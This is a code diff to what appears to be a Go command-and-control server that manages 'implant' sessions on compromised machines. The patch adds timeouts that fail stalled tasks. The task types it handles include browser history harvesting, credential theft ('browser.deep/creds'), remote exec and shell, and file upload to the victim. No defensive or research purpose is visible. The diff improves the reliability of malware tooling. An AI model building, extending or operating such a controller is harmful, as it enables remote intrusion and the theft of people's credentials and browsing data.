@@ -4,6 +4,7 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"errors"
+	"fmt"
 	"path/filepath"
 	"sync"
 	"time"
@@ -42,7 +43,19 @@ const (
 const (
 	// purgeAfter drops a session that has been silent this long; anything
 	// shorter is only marked dead so the same connection can recover.
-	purgeAfter   = 10 * time.Minute
+	purgeAfter = 10 * time.Minute
+	// stallBatch / stallTask fail an in-flight task when the implant stops
+	// talking for this long. Without it, one command the implant ignores (an
+	// old payload has no browser.deep/creds handler) or a hung child process
+	// occupies the session's single task slot forever and every later command
+	// queues behind it.
+	//
+	// Collection tasks either stream rows or finish, so a minute of silence
+	// means "not supported". Exec and shell may legitimately run for minutes,
+	// and transfers keep sending chunks (which refresh LastSeen), so they get
+	// the long budget instead.
+	stallBatch   = 60 * time.Second
+	stallTask    = 5 * time.Minute
 	maxTaskBytes = 16 << 20
 	// browsing stores (History) routinely exceed the task cap
 	maxGetBytes = 128 << 20
@@ -223,6 +236,20 @@ func (h *Hub) Tick() {
 			timeout = 90 * time.Second
 			deadAfter = 90 * time.Second
 		}
+		// A task that has gone quiet holds the only task slot on this session.
+		// Fail it so the queue can move instead of stalling until purgeAfter.
+		if s.Busy {
+			if t := h.inFlightLocked(s); t != nil && !t.Done && age >= stallFor(t.Kind) {
+				t.Done = true
+				t.Err = fmt.Sprintf("implant 无响应（%s 无数据），任务已中止；该指令可能不被此植入端支持",
+					stallFor(t.Kind))
+				s.Busy = false
+				s.currentID = ""
+				h.emitLocked(Event{Kind: EventTaskError, SessionID: id, TaskID: t.ID, Error: t.Err})
+				h.kickLocked(s)
+			}
+		}
+
 		switch {
 		case age >= purgeAfter:
 			// The socket never closed and never spoke again: forget it.
@@ -321,6 +348,16 @@ func putSend(send func(protocol.Type, []byte) error, path string, data []byte, o
 		_ = send(protocol.CmdFsPut, chunk)
 	}
 	_ = send(protocol.CmdFsPut, []byte{2})
+}
+
+// stallFor picks the silence budget for a task kind.
+func stallFor(kind TaskKind) time.Duration {
+	switch kind {
+	case TaskBrowser, TaskBrowserDeep, TaskCreds:
+		return stallBatch
+	default:
+		return stallTask
+	}
 }
 
 func (h *Hub) kickLocked(s *Session) {
